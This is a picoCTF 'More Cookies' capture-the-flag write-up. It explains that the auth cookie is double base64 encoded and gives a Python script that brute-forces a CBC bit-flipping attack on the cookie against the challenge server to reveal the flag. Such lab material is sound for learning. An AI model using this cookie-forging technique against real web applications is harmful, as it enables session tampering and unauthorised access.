# CTF Challenge

Platform: picoCTF </br>
Type: `Web Exploitation` </br>
Link: [More Cookies](https://play.picoctf.org/practice/challenge/124?category=1&page=1) </br>
Hint: Homomorphic Encryption </br>
Clue: Take a look at the challenge description, watch out the capital letters </br>

> I encourage you to find by yourself first! </br>
[Flag](./flag.txt) </br>

---

## Step 1
This challenge is a bit difficult, the cookies may seem like encoded using base64 encoding, however, when you try to decode it, the result is still a gibberish text </br>

## Step 2
To decrypt it, we need to get our hands dirty with Python scripting. I got the script from this [GitHub repository](https://github.com/HHousen/PicoCTF-2021/blob/6f9f20933e1ed467dbdfcdd7af027a06439e2d84/Web%20Exploitation/More%20Cookies/script.py)
```
# Source: https://github.com/HHousen/PicoCTF-2021/blob/6f9f20933e1ed467dbdfcdd7af027a06439e2d84/Web%20Exploitation/More%20Cookies/script.py

from base64 import b64decode, b64encode
from tqdm import tqdm
import requests

# Bit flip code, based on https://crypto.stackexchange.com/questions/66085/bit-flipping-attack-on-cbc-mode/66086#66086?newreg=f9b1c7c4911f4e50abef6f252b2a8255
# Decode from base64 twice because the cookie was encoded twice.
def bit_flip( pos, bit, data ):
    raw = b64decode( b64decode(data).decode() )
        
    list1 = bytearray( raw )
    list1[pos] = list1[pos] ^ bit
    raw = bytes( list1 )

    return b64encode( b64encode(raw) ).decode()

cookie = "<your-cookie-goes-here>"

for pos_index in tqdm( range(10), desc = "Bruteforcing Position" ):
    for bit_index in tqdm( range(128), desc = "Bruteforcing Bit" ):
        auth_cookie = bit_flip( pos_index, bit_index, cookie )
        cookies = {'auth_name': auth_cookie}
        req = requests.get( 'http://mercury.picoctf.net:<port_number>/', cookies=cookies )

        if "picoCTF{" in req.text:
            # The flag is between '<code>' and '</code>'
            print( "\nFlag: " + req.text.split("<code>")[1].split("</code>")[0] )
            break
```
Save it as `bitFlip.py`, then run it in the terminal </br>
